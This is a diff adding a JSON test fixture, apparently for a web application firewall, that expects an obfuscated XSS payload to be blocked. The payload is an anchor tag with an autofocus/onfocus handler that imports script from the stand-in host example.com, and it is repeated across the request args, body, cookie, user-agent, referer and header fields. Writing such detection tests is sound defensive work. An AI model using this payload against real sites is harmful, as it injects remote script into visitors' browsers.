@@ -1,0 +1,15 @@
+{
+  "payload": [
+    {
+      "ARGS": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "BODY": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "COOKIE": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "USER-AGENT": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "REFERER": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "HEADER": "<A HRef=//example.com AutoFocus %26%2362 OnFocus%0C=import(href)>",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "source": ""
+}
